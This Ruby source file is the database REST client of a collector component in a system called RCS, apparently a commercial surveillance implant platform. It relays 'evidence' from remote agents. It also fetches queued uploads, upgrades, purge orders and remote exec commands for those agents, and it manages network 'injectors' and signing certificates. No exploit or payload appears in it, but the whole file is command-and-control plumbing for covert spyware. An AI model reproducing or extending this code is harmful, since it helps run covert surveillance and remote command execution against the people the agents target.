#
#  DB layer for REST communication
#

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/cgi'

# system
require 'net/http'
require 'timeout'
require 'thread'
require 'json'

require 'persistent_http'

module RCS
module Collector

class DB_rest
  include RCS::Tracer

  def initialize(host)
    @host, @port = host.split(':')

    verify_mode = Config.instance.global['SSL_VERIFY'] ? OpenSSL::SSL::VERIFY_PEER : OpenSSL::SSL::VERIFY_NONE

    # the HTTP connection object
    @http = PersistentHTTP.new(
              :name         => 'PersistentToDB',
              :pool_size    => 20,
              :host         => @host,
              :port         => @port,
              :use_ssl      => true,
              :ca_file      => Config.instance.file('DB_CERT'),
              :cert         => OpenSSL::X509::Certificate.new(File.read(Config.instance.file('DB_CERT'))),
              :verify_mode  => verify_mode
            )

    trace :debug, "Using REST to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def rest_call(method, uri, content = nil, headers = {})
    # the HTTP headers for the authentication
    full_headers = {'Cookie' => @cookie, 'Connection' => 'Keep-Alive' }
    full_headers.merge! headers if headers.is_a? Hash
    case method
      when 'POST'
        request = Net::HTTP::Post.new(uri, full_headers)
        request.body = content
        @http.request(request)
      when 'GET'
        request = Net::HTTP::Get.new(uri, full_headers)
        @http.request(request)
      #when 'PUT'
      #  @http.request_put(uri, full_headers)
      when 'DELETE'
        request = Net::HTTP::Delete.new(uri, full_headers)
        @http.request(request)
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # it means that we are not able to talk to the db
    trace :warn, "The DB in not responding: #{e.class} #{e.message}"
    raise
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      # send the authentication data
      account = {:user => user, :pass => pass}
      request = Net::HTTP::Post.new('/auth/login')
      request.body = account.to_json
      resp = @http.request(request)
      # remember the session cookie
      @cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
      # check that the response is valid JSON
      return JSON.parse(resp.body).class == Hash
    rescue Exception => e
      trace :error, "Error logging in: #{e.class} #{e.message}"
      return false
    end
  end

  def logout
    begin
      rest_call('POST', '/auth/logout', nil)
      return true
    rescue Exception => e
      trace :error, "Error logging out: #{e.class} #{e.message}"
      return false
    end
  end

  def sync_start(session, version, user, device, source, time)
    begin
      content = {:bid => session[:bid],
                 :ident => session[:ident],
                 :instance => session[:instance],
                 :platform => session[:platform],
                 :demo => session[:demo],
                 :scout => session[:scout],
                 :version => version,
                 :user => user,
                 :device => device,
                 :source => source,
                 :sync_time => time}

      ret = rest_call('POST', '/evidence/start', content.to_json)
      raise unless ret.kind_of? Net::HTTPOK
    rescue Exception => e
      trace :fatal, "evidence start failed #{e.message}"
      raise
    end
  end

  def sync_update(session, version, user, device, source, time)
    begin
      content = {:bid => session[:bid],
                 :ident => session[:ident],
                 :instance => session[:instance],
                 :platform => session[:platform],
                 :demo => session[:demo],
                 :scout => session[:scout],
                 :version => version,
                 :user => user,
                 :device => device,
                 :source => source,
                 :sync_time => time}

      ret = rest_call('POST', '/evidence/start_update', content.to_json)
      raise unless ret.kind_of? Net::HTTPOK
    rescue Exception => e
      trace :fatal, "evidence start failed #{e.message}"
      raise
    end
  end

  def sync_timeout(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/timeout', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_timeout: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def sync_end(session)
    begin
      content = {:bid => session[:bid], :instance => session[:instance]}
      return rest_call('POST', '/evidence/stop', content.to_json)
    rescue Exception => e
      trace :error, "Error calling sync_end: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def send_evidence(instance, evidence)
    begin
      ret = rest_call('POST', "/evidence/#{instance}", evidence)

      case ret
        when Net::HTTPSuccess then return true, "OK", :delete
        when Net::HTTPConflict then return false, "empty evidence", :delete
      end

      return false, ret.body
    rescue Exception => e
      trace :error, "Error calling send_evidence: #{e.class} #{e.message}"
      trace :fatal, e.backtrace
      propagate_error e
    end
  end

  def status_update(component, remoteip, status, message, disk, cpu, pcpu, type, version)
    begin
      content = {:name => component, :address => remoteip, :status => status, :info => message, :disk => disk, :cpu => cpu, :pcpu => pcpu, :type => type, :version => version}
      return rest_call('POST', '/status', content.to_json)
    rescue Exception => e
      trace :error, "Error calling status_update: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def agent_signature
    begin
      ret = rest_call('GET', '/signature/agent')
      sign = JSON.parse(ret.body)['value']
      return sign
    rescue Exception => e
      trace :error, "Error calling agent_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def network_signature
    begin
      ret = rest_call('GET', '/signature/network')
      sign = JSON.parse(ret.body)['value']
      return sign
    rescue Exception => e
      trace :error, "Error calling network_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def check_signature
    begin
      ret = rest_call('GET', '/signature/check')
      sign = JSON.parse(ret.body)['value']
      return sign
    rescue Exception => e
      trace :error, "Error calling check_signature: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # used to authenticate the agents
  def factory_keys(ident = '')
    begin
      if ident != '' then
        ret = rest_call('GET', "/agent/factory_keys/#{ident}")
      else
        ret = rest_call('GET', '/agent/factory_keys')
      end
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling factory_keys: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # agent identify
  def agent_status(build_id, instance_id, platform, demo, scout)
    begin
      request = {:ident => build_id, :instance => instance_id, :platform => platform, :demo => demo, :scout => scout}
      ret = rest_call('GET', '/agent/status/?' + CGI.encode_query(request))
      
      return {status: DB::NO_SUCH_AGENT, id: 0, good: false} if ret.kind_of? Net::HTTPNotFound
      return {status: DB::UNKNOWN_AGENT, id: 0, good: false} unless ret.kind_of? Net::HTTPOK

      status = JSON.parse(ret.body)

      aid = status['_id']
      good = status['good']

      return {status: DB::DELETED_AGENT, id: aid, good: good} if status['deleted']

      case status['status']
        when 'OPEN'
          return {status: DB::ACTIVE_AGENT, id: aid, good: good}
        when 'QUEUED'
          return {status: DB::QUEUED_AGENT, id: aid, good: good}
        when 'CLOSED'
          return {status: DB::CLOSED_AGENT, id: aid, good: good}
      end
    rescue Exception => e
      trace :error, "Error calling agent_status: #{e.class} #{e.message}"
      return {status: DB::UNKNOWN_AGENT, id: 0, good: false}
    end
  end

  def agent_uninstall(agent_id)
    begin
      rest_call('POST', "/agent/uninstall/#{agent_id}")

    rescue Exception => e
      trace :error, "Error calling agent_uninstall: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_conf(bid)
    begin
      ret = rest_call('GET', "/agent/config/#{bid}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling new_conf: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def activate_conf(bid)
    begin
      return rest_call('DELETE', "/agent/config/#{bid}")
    rescue Exception => e
      trace :error, "Error calling activate_conf: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_uploads(bid)
    begin
      ret = rest_call('GET', "/agent/uploads/#{bid}")

      upl = {}
      # parse the results and get the contents of the uploads
      JSON.parse(ret.body).each do |elem|
        request = {:upload => elem['_id']}
        upl[elem['_id']] = {:filename => elem['filename'],
                            :content => rest_call('GET', "/agent/upload/#{bid}?" + CGI.encode_query(request)).body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upl[elem['_id']][:content].length} bytes"
      end
      
      return upl 
    rescue Exception => e
      trace :error, "Error calling new_uploads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upload(bid, id)
    begin
      return rest_call('DELETE', "/agent/upload/#{bid}?" + CGI.encode_query({:upload => id}))
    rescue Exception => e
      trace :error, "Error calling del_upload: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def new_upgrades(bid)
    begin
      ret = rest_call('GET', "/agent/upgrades/#{bid}")

      upgr = {}
      # parse the results and get the contents of the upgrade
      JSON.parse(ret.body).each do |elem|
        request = {:upgrade => elem['_id']}
        upgr[elem['_id']] = {:filename => elem['filename'],
                            :content => rest_call('GET', "/agent/upgrade/#{bid}?" + CGI.encode_query(request)).body }
        trace :debug, "File retrieved: [#{elem['filename']}] #{upgr[elem['_id']][:content].length} bytes"
      end

      return upgr
    rescue Exception => e
      trace :error, "Error calling new_upgrades: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_upgrade(bid)
    begin
      return rest_call('DELETE', "/agent/upgrade/#{bid}")
    rescue Exception => e
      trace :error, "Error calling del_upgrade: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the download list from db (if any)
  def new_downloads(bid)
    begin
      ret = rest_call('GET', "/agent/downloads/#{bid}")

      down = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        down[elem['_id']] = elem['path']
      end
      
      return down
    rescue Exception => e
      trace :error, "Error calling new_downloads: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_download(bid, id)
    begin
      return rest_call('DELETE', "/agent/download/#{bid}?" + CGI.encode_query({:download => id}))
    rescue Exception => e
      trace :error, "Error calling del_download: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the filesystem list from db (if any)
  def new_filesystems(bid)
    begin
      ret = rest_call('GET', "/agent/filesystems/#{bid}")

      files = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        files[elem['_id']] = {:depth => elem['depth'], :path => elem['path']}
      end
      
      return files
    rescue Exception => e
      trace :error, "Error calling new_filesystems: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_filesystem(bid, id)
    begin
      return rest_call('DELETE', "/agent/filesystem/#{bid}?" + CGI.encode_query({:filesystem => id}))
    rescue Exception => e
      trace :error, "Error calling del_filesystem: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the filesystem list from db (if any)
  def purge(bid)
    begin
      ret = rest_call('GET', "/agent/purge/#{bid}")

      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling purge: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_purge(bid)
    begin
      return rest_call('DELETE', "/agent/purge/#{bid}")
    rescue Exception => e
      trace :error, "Error calling del_purge: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  # retrieve the exec list from db (if any)
  def new_exec(bid)
    begin
      ret = rest_call('GET', "/agent/exec/#{bid}")

      commands = {}
      # parse the results
      JSON.parse(ret.body).each do |elem|
        commands[elem['_id']] = elem['command']
      end

      return commands
    rescue Exception => e
      trace :error, "Error calling new_exec: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def del_exec(bid, id)
    begin
      return rest_call('DELETE', "/agent/exec/#{bid}?" + CGI.encode_query({:exec => id}))
    rescue Exception => e
      trace :error, "Error calling del_exec: #{e.class} #{e.message}"
      propagate_error e
    end
  end


  def get_proxies
    begin
      ret = rest_call('GET', "/injector")
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling get_proxies: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def injector_set_version(id, version)
    begin
      rest_call('POST', "/injector/version/#{id}", {:version => version}.to_json)
    rescue Exception => e
      trace :error, "Error calling injector_set_version: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def injector_config(id)
    begin
      ret = rest_call('GET', "/injector/config/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling injector_config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def injector_upgrade(id)
    begin
      ret = rest_call('GET', "/injector/upgrade/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling injector_upgrade: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def injector_add_log(id, time, type, desc)
    begin
      log = {:type => type, :time => time, :desc => desc}
      rest_call('POST', "/injector/logs/#{id}", log.to_json)
    rescue Exception => e
      trace :error, "Error calling injector_add_log: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_collectors
    begin
      ret = rest_call('GET', "/collector")
      return JSON.parse(ret.body)
    rescue Exception => e
      trace :error, "Error calling get_collectors: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_set_version(id, version)
    begin
      rest_call('POST', "/collector/version/#{id}", {:version => version}.to_json)
    rescue Exception => e
      trace :error, "Error calling collector_set_version: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_config(id)
    begin
     ret = rest_call('GET', "/collector/config/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling collector_config: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_upgrade(id)
    begin
     ret = rest_call('GET', "/collector/upgrade/#{id}")

      if ret.kind_of? Net::HTTPNotFound then
        return nil
      end

      return ret.body
    rescue Exception => e
      trace :error, "Error calling collector_upgrade: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def collector_add_log(id, time, type, desc)
    begin
      log = {:_id => id, :type => type, :time => time, :desc => desc}
      rest_call('POST', "/collector/log", log.to_json)
    rescue Exception => e
      trace :error, "Error calling collector_add_log: #{e.class} #{e.message}"
      propagate_error e
    end
  end

  def get_network_cert(file)
    begin
      res = rest_call('GET', "/signature/network.pem")
      sig = JSON.parse(res.body)
      File.open(file + '.pem', 'wb') {|f| f.write sig['value']} unless sig['value'].nil?

      res = rest_call('GET', "/signature/network")
      sig = JSON.parse(res.body)
      File.open(file + '.sig', 'wb') {|f| f.write sig['value']} unless sig['value'].nil?
    rescue Exception => e
      trace :error, "Error calling get_network_cert: #{e.class} #{e.message}"
      propagate_error e
    end
  end

end #

end #Collector::
end #RCS::